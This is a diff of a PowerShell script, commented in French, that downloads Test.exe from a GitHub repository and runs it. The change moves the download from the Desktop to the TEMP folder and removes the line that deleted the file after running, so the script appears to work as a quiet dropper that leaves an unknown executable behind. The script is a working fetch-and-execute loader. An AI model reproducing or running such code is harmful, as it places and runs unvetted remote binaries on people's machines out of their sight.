@@ -18,8 +18,7 @@ $consolePtr = [ConsoleWindow]::GetConsoleWindow()
 
 # Définir l'URL du fichier à télécharger et le chemin de destination
 $FileUrl = "https://github.com/Gabkill54/Kidou-Software/raw/main/Test.exe"
-$DesktopPath = [Environment]::GetFolderPath("Desktop")
-$DestinationPath = "$DesktopPath\Test.exe"
+$DestinationPath = "$env:TEMP\Test.exe"
 
 # Télécharger le fichier avec Invoke-WebRequest
 try {
@@ -52,7 +51,5 @@ try {
 
 
 Start-Process -FilePath $FilePath -Wait
-
-Remove-Item $FilePath
 
 exit
